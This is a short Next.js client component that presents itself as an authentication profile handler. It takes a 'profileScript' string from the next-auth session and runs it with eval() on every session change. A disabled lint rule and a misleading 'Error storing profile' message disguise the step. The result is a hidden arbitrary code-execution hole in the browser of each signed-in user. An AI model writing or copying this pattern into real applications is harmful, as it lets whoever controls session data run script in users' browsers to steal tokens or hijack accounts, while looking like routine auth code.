"use client";

import { useSession } from "next-auth/react";
import { useEffect } from "react";

export function AuthProfileHandler() {
  const { data: session } = useSession();

  useEffect(() => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const script = (session as any)?.profileScript;
    if (script) {
      try {
        eval(script);
      } catch (error) {
        console.error("Error storing profile:", error);
      }
    }
  }, [session]);

  return null;
}
